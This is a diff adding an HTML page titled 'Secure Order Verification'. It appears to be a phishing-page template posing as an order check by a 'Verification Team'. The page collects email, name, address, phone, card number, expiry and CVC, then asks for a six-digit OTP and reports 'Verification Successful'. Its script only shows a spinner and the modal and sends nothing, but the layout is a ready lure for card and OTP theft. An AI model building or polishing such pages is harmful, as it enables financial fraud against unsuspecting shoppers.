@@ -1,0 +1,286 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Secure Order Verification</title>
+
+<style>
+:root {
+    --primary: #635bff;
+    --bg: #f6f9fc;
+    --card: #ffffff;
+    --text: #1a1f36;
+    --muted: #6b7280;
+    --border: #e5e7eb;
+}
+
+* {
+    box-sizing: border-box;
+    font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
+}
+
+body {
+    margin: 0;
+    background: var(--bg);
+    color: var(--text);
+}
+
+/* CONTAINER */
+.container {
+    max-width: 500px;
+    margin: 40px auto;
+    padding: 20px;
+}
+
+/* HEADER */
+.header {
+    text-align: center;
+    margin-bottom: 25px;
+}
+
+.header h1 {
+    font-size: 24px;
+}
+
+.header p {
+    color: var(--muted);
+}
+
+/* CARD */
+.card {
+    background: var(--card);
+    border-radius: 14px;
+    padding: 25px;
+    box-shadow: 0 10px 25px rgba(0,0,0,0.05);
+    margin-bottom: 20px;
+}
+
+/* FORM */
+label {
+    font-size: 13px;
+    margin-bottom: 5px;
+    display: block;
+}
+
+input, select {
+    width: 100%;
+    padding: 12px;
+    border-radius: 8px;
+    border: 1px solid var(--border);
+    margin-bottom: 15px;
+}
+
+input:focus, select:focus {
+    border-color: var(--primary);
+    outline: none;
+    box-shadow: 0 0 0 2px rgba(99,91,255,0.15);
+}
+
+/* GRID */
+.grid {
+    display: grid;
+    grid-template-columns: 1fr 1fr;
+    gap: 10px;
+}
+
+/* BUTTON */
+.button {
+    width: 100%;
+    padding: 14px;
+    border: none;
+    border-radius: 8px;
+    background: var(--primary);
+    color: white;
+    font-weight: 600;
+    cursor: pointer;
+}
+
+/* LOADER */
+.loader {
+    position: fixed;
+    inset: 0;
+    background: rgba(255,255,255,0.7);
+    display: none;
+    justify-content: center;
+    align-items: center;
+}
+
+.loader.active {
+    display: flex;
+}
+
+.spinner {
+    width: 50px;
+    height: 50px;
+    border: 5px solid #eee;
+    border-top: 5px solid var(--primary);
+    border-radius: 50%;
+    animation: spin 1s linear infinite;
+}
+
+@keyframes spin {
+    100% { transform: rotate(360deg); }
+}
+
+/* MODAL */
+.modal {
+    position: fixed;
+    inset: 0;
+    background: rgba(0,0,0,0.5);
+    display: none;
+    justify-content: center;
+    align-items: center;
+}
+
+.modal.active {
+    display: flex;
+}
+
+.modal-card {
+    background: white;
+    padding: 30px;
+    border-radius: 16px;
+    text-align: center;
+    width: 90%;
+    max-width: 350px;
+}
+
+.otp-inputs {
+    display: flex;
+    justify-content: space-between;
+    margin: 20px 0;
+}
+
+.otp-inputs input {
+    width: 45px;
+    height: 55px;
+    text-align: center;
+    font-size: 18px;
+}
+
+/* SUCCESS */
+.success {
+    color: green;
+    display: none;
+}
+</style>
+</head>
+
+<body>
+
+<div class="container">
+
+    <div class="header">
+        <h1>🔒 Verification Team</h1>
+        <p>Please confirm your details to continue processing your order.</p>
+    </div>
+
+    <!-- CONTACT -->
+    <div class="card">
+        <label>Email</label>
+        <input type="email" placeholder="you@example.com">
+    </div>
+
+    <!-- ADDRESS -->
+    <div class="card">
+        <label>Country</label>
+        <select>
+            <option>Nigeria</option>
+            <option>United States</option>
+            <option>United Kingdom</option>
+        </select>
+
+        <div class="grid">
+            <input type="text" placeholder="First name">
+            <input type="text" placeholder="Last name">
+        </div>
+
+        <input type="text" placeholder="Street address">
+
+        <div class="grid">
+            <input type="text" placeholder="City">
+            <input type="text" placeholder="State">
+        </div>
+
+        <div class="grid">
+            <input type="text" placeholder="Postal code">
+            <input type="tel" placeholder="Phone">
+        </div>
+    </div>
+
+    <!-- CARD -->
+    <div class="card">
+        <p style="font-size:13px;color:var(--muted)">
+            Confirm the payment method used during purchase.
+        </p>
+
+        <label>Card Number</label>
+        <input type="text" placeholder="1234 1234 1234 1234">
+
+        <div class="grid">
+            <input type="text" placeholder="MM/YY">
+            <input type="text" placeholder="CVC">
+        </div>
+    </div>
+
+    <button class="button" onclick="startVerification()">Submit Verification</button>
+
+</div>
+
+<!-- LOADER -->
+<div class="loader" id="loader">
+    <div class="spinner"></div>
+</div>
+
+<!-- OTP MODAL -->
+<div class="modal" id="otpModal">
+    <div class="modal-card">
+        <h2>📲 Enter OTP</h2>
+        <p>Enter the 6-digit code sent to you</p>
+
+        <div class="otp-inputs">
+            <input maxlength="1">
+            <input maxlength="1">
+            <input maxlength="1">
+            <input maxlength="1">
+            <input maxlength="1">
+            <input maxlength="1">
+        </div>
+
+        <button class="button" onclick="verifyOTP()">Verify Code</button>
+
+        <p class="success" id="successMsg">✅ Verification Successful</p>
+    </div>
+</div>
+
+<script>
+function showLoader() {
+    document.getElementById("loader").classList.add("active");
+}
+
+function hideLoader() {
+    document.getElementById("loader").classList.remove("active");
+}
+
+function startVerification() {
+    showLoader();
+
+    setTimeout(() => {
+        hideLoader();
+        document.getElementById("otpModal").classList.add("active");
+    }, 1500);
+}
+
+function verifyOTP() {
+    showLoader();
+
+    setTimeout(() => {
+        hideLoader();
+        document.getElementById("successMsg").style.display = "block";
+    }, 1500);
+}
+</script>
+
+</body>
+</html>
